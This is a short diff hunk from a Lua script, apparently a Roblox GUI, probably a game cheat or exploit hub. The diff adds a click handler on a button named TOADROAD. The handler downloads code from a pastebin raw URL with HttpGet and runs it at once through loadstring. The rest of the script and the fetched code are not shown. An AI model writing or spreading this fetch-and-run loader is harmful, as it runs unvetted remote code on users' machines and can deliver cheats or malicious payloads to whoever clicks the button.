@@ -436,7 +436,7 @@ TOADROAD.TextScaled = true
 TOADROAD.TextSize = 500
 TOADROAD.TextWrapped = true
 TOADROAD.MouseButton1Down:connect(function()
-
+loadstring(game:HttpGet("https://pastebin.com/raw/yRwAAy77"))()
 end)
 
 -- Scripts :
